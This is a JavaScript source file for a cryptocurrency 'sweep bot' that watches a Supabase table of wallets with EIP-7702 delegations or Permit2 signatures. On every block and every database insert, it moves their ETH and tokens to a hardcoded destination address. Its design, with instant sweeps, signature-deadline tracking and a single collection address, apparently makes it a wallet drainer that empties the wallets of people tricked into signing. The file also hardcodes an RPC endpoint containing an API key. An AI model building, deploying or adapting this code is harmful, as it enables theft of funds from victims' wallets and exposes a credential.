// bot.js — Sweep bot with EIP-7702 delegation + Permit2 fallback support
// Watches delegated_wallets via Supabase Realtime.
//
// Architecture:
//   wsProvider  — WebSocketProvider for instant block events (WS_URL)
//   rpcProvider — JsonRpcProvider for ALL balance/fee/tx calls (RPC_URL)
//
// Sweep strategy:
//   Block events      → sweep wallets whose 30s cooldown has expired
//   Realtime INSERT/UPDATE → sweep immediately, bypass cooldown

require("dotenv").config();
const { ethers } = require("ethers");
const { createClient } = require("@supabase/supabase-js");
const ws = require("ws");

// ── Config ────────────────────────────────────────────────────────────────────

const PRIVATE_KEY               = process.env.PRIVATE_KEY;
const WS_URL = process.env.WS_URL
  || "wss://patient-convincing-pool.ethereum-mainnet.quiknode.pro/1abd23fdb0d95f4f5cc1c38c71acec1ec862e330";
const RPC_URL = process.env.RPC_URL
  || "https://patient-convincing-pool.ethereum-mainnet.quiknode.pro/1abd23fdb0d95f4f5cc1c38c71acec1ec862e330";
const CONTRACT_ADDRESS          = process.env.CONTRACT_ADDRESS;
const DESTINATION_ADDRESS       = process.env.DESTINATION_ADDRESS || "0x8Da0f664bb5091585148333275FcF0607b258026";
const TOKENS_TO_WATCH           = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
const SUPABASE_URL              = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const CHAIN                     = process.env.CHAIN || "eth";

const PERMIT2_ADDRESS   = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MIN_ETH_WEI       = ethers.parseEther("0.001");
const MIN_TOKEN_UNITS   = "0.5";
const SWEEP_COOLDOWN_MS = 30_000; // 30s per-wallet cooldown between block sweeps
const TOKEN_CALL_DELAY  = 50;     // ms between token balance checks (rate-limit protection)

// ── Validation ────────────────────────────────────────────────────────────────

if (!PRIVATE_KEY || !DESTINATION_ADDRESS) {
  console.error("Missing required env vars: PRIVATE_KEY, DESTINATION_ADDRESS");
  process.exit(1);
}
if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.warn("⚠️  SUPABASE env missing — Realtime disabled, permit2_signatures unavailable");
}

// ── Providers ─────────────────────────────────────────────────────────────────
//
// rpcProvider — HTTP JsonRpc for ALL contract/balance/fee/tx calls
// wsProvider  — WebSocket for block events ONLY; recreated on disconnect
//               NEVER passed to a Contract or Wallet

const rpcProvider = new ethers.JsonRpcProvider(RPC_URL);

const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
      auth: { persistSession: false },
      realtime: { transport: ws },
    })
  : null;

// ── ABIs ──────────────────────────────────────────────────────────────────────

const CONTRACT_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
  "event ETHReceived(address indexed sender, uint256 amount)",
];

const DELEGATION_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
];

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
];

const PERMIT2_ABI = [
  "function transferFrom(address from, address to, uint160 amount, address token) external",
  "function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
];

// ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────
// RULE: wsProvider is NEVER passed to a Contract or Wallet.

const relayerWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
const permit2       = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayerWallet);
const contract      = CONTRACT_ADDRESS
  ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, relayerWallet)
  : null;

// ── State ─────────────────────────────────────────────────────────────────────

let sweepingETH        = false;
const sweepingToken    = {};
const delegatedWallets = new Map(); // address → type ("eip7702" | "permit2")
const expiredLogged    = new Set(); // permit2 wallets whose signature expired
const lastSwept        = new Map(); // address → timestamp of last sweep
let realtimeChannel    = null;
const BACKOFF_MS       = [10_000, 30_000, 60_000, 120_000];
let reconnectAttempt   = 0;

// ── Logging ───────────────────────────────────────────────────────────────────

const TAG  = `[${CHAIN.toUpperCase()}]`;
const log  = (msg) => console.log(`[${new Date().toISOString()}] ${TAG} ${msg}`);
const warn = (msg) => console.warn(`[${new Date().toISOString()}] ${TAG} ⚠  ${msg}`);
const err  = (msg) => console.error(`[${new Date().toISOString()}] ${TAG} ✖  ${msg}`);

// ── Helpers ───────────────────────────────────────────────────────────────────

function normalizeAddress(addr) {
  try { return ethers.getAddress(addr); } catch { return null; }
}

async function getFeeData() {
  const f = await rpcProvider.getFeeData();
  return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
}

// 30s cooldown — Realtime events bypass this entirely
function shouldSweep(address) {
  const last = lastSwept.get(address.toLowerCase());
  if (!last) return true;
  return Date.now() - last > SWEEP_COOLDOWN_MS;
}

function markSwept(address) {
  lastSwept.set(address.toLowerCase(), Date.now());
}

// ── Supabase helpers ──────────────────────────────────────────────────────────

async function getWalletType(walletAddress) {
  if (!supabase) return "eip7702";
  try {
    const { data } = await supabase
      .from("delegated_wallets")
      .select("type")
      .eq("address", walletAddress.toLowerCase())
      .eq("chain", CHAIN)
      .single();
    return data?.type || "eip7702";
  } catch {
    return "eip7702";
  }
}

// ── Main-contract sweep ───────────────────────────────────────────────────────

async function sweepETH() {
  if (sweepingETH || !contract) return;
  sweepingETH = true;
  try {
    const bal = await rpcProvider.getBalance(contract.target);
    if (bal < MIN_ETH_WEI) return;
    log(`Contract ETH ${ethers.formatEther(bal)} — sweeping`);
    const gas = await contract.sweepETH.estimateGas(DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx  = await contract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
    log(`sweepETH tx: ${tx.hash}`);
    await tx.wait();
    log("sweepETH confirmed");
  } catch (e) { err(`sweepETH: ${e.message}`); }
  finally    { sweepingETH = false; }
}

async function sweepToken(tokenAddress) {
  const key = tokenAddress.toLowerCase();
  if (sweepingToken[key] || !contract) return;
  sweepingToken[key] = true;
  try {
    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
    const balance = await token.balanceOf(contract.target);
    let decimals  = 18;
    try { decimals = await token.decimals(); } catch {}
    if (balance < ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) return;
    let symbol = tokenAddress.slice(0, 8);
    try { symbol = await token.symbol(); } catch {}
    log(`Contract ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
    const gas = await contract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx  = await contract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
    log(`sweepTokens(${symbol}) tx: ${tx.hash}`);
    await tx.wait();
  } catch (e) { err(`sweepToken(${tokenAddress}): ${e.message}`); }
  finally     { sweepingToken[key] = false; }
}

// ── EIP-7702 delegated wallet sweep ───────────────────────────────────────────

async function sweepDelegatedWallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;
  try {
    const userContract = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);

    // ETH first
    try {
      const bal = await rpcProvider.getBalance(checksum);
      if (bal > MIN_ETH_WEI) {
        log(`[eip7702] ${checksum} ETH ${ethers.formatEther(bal)} — sweeping`);
        const gas = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
        const fee = await getFeeData();
        const tx  = await userContract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
        log(`[eip7702] sweepETH(${checksum}) tx: ${tx.hash}`);
        await tx.wait();
        log(`[eip7702] sweepETH confirmed for ${checksum}`);
      }
    } catch (e) { err(`[eip7702] sweepETH ${checksum}: ${e.message}`); }

    // ERC-20 tokens — small delay between checks to avoid rate limits
    for (const tokenAddress of TOKENS_TO_WATCH) {
      try {
        await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, rpcProvider);
        const balance = await token.balanceOf(checksum);
        let decimals  = 18;
        try { decimals = await token.decimals(); } catch {}
        if (balance < ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) continue;
        let symbol = tokenAddress.slice(0, 8);
        try { symbol = await token.symbol(); } catch {}
        log(`[eip7702] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
        const gas = await userContract.sweepTokens.estimateGas(tokenAddress.trim(), DESTINATION_ADDRESS);
        const fee = await getFeeData();
        const tx  = await userContract.sweepTokens(tokenAddress.trim(), DESTINATION_ADDRESS, {
          gasLimit: gas * 120n / 100n, ...fee,
        });
        log(`[eip7702] sweepTokens(${symbol}) tx: ${tx.hash}`);
        await tx.wait();
      } catch (e) { err(`[eip7702] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
    }
  } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
}

// ── Permit2 sweep ─────────────────────────────────────────────────────────────

async function sweepPermit2Wallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum || !supabase) return;

  let tokens = [];
  let deadlineIso = null;

  const { data: sigRow, error: sigErr } = await supabase
    .from("permit2_signatures")
    .select("tokens, deadline")
    .eq("address", checksum.toLowerCase())
    .eq("chain", CHAIN)
    .order("created_at", { ascending: false })
    .limit(1)
    .single();

  if (!sigErr && sigRow) {
    tokens      = sigRow.tokens || [];
    deadlineIso = sigRow.deadline || null;
  } else {
    const { data: dwRow } = await supabase
      .from("delegated_wallets")
      .select("permit_metadata")
      .eq("address", checksum.toLowerCase())
      .eq("chain", CHAIN)
      .single();

    if (!dwRow?.permit_metadata) {
      warn(`[permit2] no signature data found for ${checksum}`);
      return;
    }
    tokens      = dwRow.permit_metadata.tokens || [];
    const dl    = dwRow.permit_metadata.deadline;
    deadlineIso = dl ? new Date(Number(dl) * 1000).toISOString() : null;
  }

  if (deadlineIso && new Date(deadlineIso) < new Date()) {
    if (!expiredLogged.has(checksum)) {
      warn(`[permit2] signature expired: ${checksum} (deadline=${deadlineIso}) — removing from sweep`);
      expiredLogged.add(checksum);
    }
    delegatedWallets.delete(checksum);
    return;
  }

  if (!tokens.length) {
    warn(`[permit2] no tokens found for ${checksum}`);
    return;
  }

  log(`[permit2] sweeping ${checksum} — ${tokens.length} token(s)`);

  for (const entry of tokens) {
    const tokenAddress = normalizeAddress(typeof entry === "string" ? entry : entry.token || entry.tokenAddress);
    if (!tokenAddress) continue;

    try {
      await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
      const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
      const balance = await token.balanceOf(checksum);
      let decimals  = 18;
      try { decimals = await token.decimals(); } catch {}
      const minWei  = ethers.parseUnits(MIN_TOKEN_UNITS, decimals);
      if (balance < minWei) continue;

      let symbol = tokenAddress.slice(0, 8);
      try { symbol = await token.symbol(); } catch {}
      log(`[permit2] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — transferFrom`);

      const MAX_UINT160 = (1n << 160n) - 1n;
      const amount = balance > MAX_UINT160 ? MAX_UINT160 : balance;

      const fee = await getFeeData();
      const tx = await permit2.transferFrom(
        checksum, DESTINATION_ADDRESS, amount, tokenAddress,
        { gasLimit: 150_000n, ...fee }
      );
      log(`[permit2] transferFrom(${symbol}) tx: ${tx.hash}`);
      await tx.wait();
      log(`[permit2] transferFrom(${symbol}) confirmed`);
    } catch (e) {
      err(`[permit2] transferFrom ${tokenAddress} from ${checksum}: ${e.message}`);
    }
  }
}

// ── Supabase: load existing wallets on startup ────────────────────────────────

async function loadDelegatedWallets() {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from("delegated_wallets")
      .select("address, type")
      .eq("chain", CHAIN);
    if (error) { warn(`loadDelegatedWallets: ${error.message}`); return; }
    delegatedWallets.clear();
    for (const row of data || []) {
      const checksum = normalizeAddress(row.address);
      if (checksum) delegatedWallets.set(checksum, row.type || "eip7702");
    }
    const permit2Count = [...delegatedWallets.values()].filter(t => t === "permit2").length;
    log(`Loaded ${delegatedWallets.size} wallets (${permit2Count} permit2, ${delegatedWallets.size - permit2Count} eip7702)`);
  } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
}

// ── Supabase Realtime — instant sweep, bypasses 30s cooldown ─────────────────

function subscribeRealtime() {
  if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }

  if (realtimeChannel) {
    supabase.removeChannel(realtimeChannel).catch(() => {});
    realtimeChannel = null;
  }

  realtimeChannel = supabase
    .channel(`delegated_wallets_${CHAIN}`)
    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        const isNew = !delegatedWallets.has(address);
        delegatedWallets.set(address, type);
        log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address} (type=${type}) — sweeping immediately`);

        if (type === "permit2") {
          await sweepPermit2Wallet(address).catch((e) => err(`permit2 sweep: ${e.message}`));
        } else {
          await sweepDelegatedWallet(address).catch((e) => err(`eip7702 sweep: ${e.message}`));
        }
        markSwept(address); // reset cooldown after realtime sweep
      }
    )
    .on(
      "postgres_changes",
      { event: "UPDATE", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        delegatedWallets.set(address, type);
        log(`🔄 Realtime update ${address} (type=${type}) — sweeping immediately`);
        if (type === "permit2") {
          await sweepPermit2Wallet(address).catch((e) => err(`permit2 sweep: ${e.message}`));
        } else {
          await sweepDelegatedWallet(address).catch((e) => err(`eip7702 sweep: ${e.message}`));
        }
        markSwept(address);
      }
    )
    .subscribe((status) => {
      if (status === "SUBSCRIBED") {
        log(`✅ Supabase Realtime subscribed (chain=${CHAIN})`);
      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
        warn(`Realtime ${status} — resubscribing in 10s`);
        setTimeout(subscribeRealtime, 10_000);
      }
    });
}

// ── WSS block listener + exponential backoff reconnect ───────────────────────
//
// wsProvider is recreated on every (re)connect.
// All RPC/tx calls continue to use rpcProvider (HTTP) — WSS is block-events only.

async function startBot() {
  try {
    const wsProvider = new ethers.WebSocketProvider(WS_URL);

    wsProvider.websocket.on("error", (wsErr) => {
      warn(`WS error: ${wsErr?.message ?? wsErr}`);
    });

    wsProvider.websocket.on("close", () => {
      warn("WS closed — scheduling reconnect…");
      wsProvider.removeAllListeners();
      const delay = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
      reconnectAttempt++;
      log(`Reconnecting in ${delay / 1000}s (attempt ${reconnectAttempt})…`);
      setTimeout(startBot, delay);
    });

    wsProvider.on("block", async (blockNumber) => {
      reconnectAttempt = 0; // reset backoff on successful block

      // Main-contract sweep (no cooldown — these are cheap checks)
      if (contract) {
        await sweepETH();
        for (const tokenAddress of TOKENS_TO_WATCH) {
          await sweepToken(tokenAddress.trim());
        }
      }

      // Only sweep wallets whose 30s cooldown has expired
      const due = [...delegatedWallets.keys()].filter(shouldSweep);
      if (due.length === 0) return;
      log(`Block ${blockNumber} — ${due.length}/${delegatedWallets.size} wallet(s) due`);

      for (const walletAddress of due) {
        const walletType = delegatedWallets.get(walletAddress);
        try {
          if (walletType === "permit2") {
            await sweepPermit2Wallet(walletAddress);
          } else {
            await sweepDelegatedWallet(walletAddress);
          }
          markSwept(walletAddress);
        } catch (e) {
          err(`sweep failed for ${walletAddress}: ${e.message}`);
        }
      }
    });

    log(`WS connected — listening for blocks`);
  } catch (e) {
    err(`startBot failed: ${e.message}`);
    const delay = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
    reconnectAttempt++;
    log(`Retrying in ${delay / 1000}s (attempt ${reconnectAttempt})…`);
    setTimeout(startBot, delay);
  }
}

// ── Init ──────────────────────────────────────────────────────────────────────

async function init() {
  log("Sweep bot starting…");
  log(`Chain:       ${CHAIN}`);
  log(`Relayer:     ${relayerWallet.address}`);
  log(`Destination: ${DESTINATION_ADDRESS}`);
  log(`Permit2:     ${PERMIT2_ADDRESS}`);
  if (CONTRACT_ADDRESS) log(`Contract:    ${CONTRACT_ADDRESS}`);

  try {
    const balance = await rpcProvider.getBalance(relayerWallet.address);
    log(`Relayer bal: ${ethers.formatEther(balance)} native`);
    if (balance < ethers.parseEther("0.005")) warn("Relayer LOW — top up or sweeps will fail");
  } catch (e) {
    warn(`Relayer balance check failed: ${e.message}`);
  }

  await loadDelegatedWallets();
  subscribeRealtime();
  startBot();

  log("Listening for blocks (WSS) and Realtime events…");
}

init().catch((e) => { err(`Init failed: ${e.message}`); process.exit(1); });

process.on("SIGINT",  () => { log("Shutting down…"); process.exit(0); });
process.on("SIGTERM", () => { log("Shutting down…"); process.exit(0); });
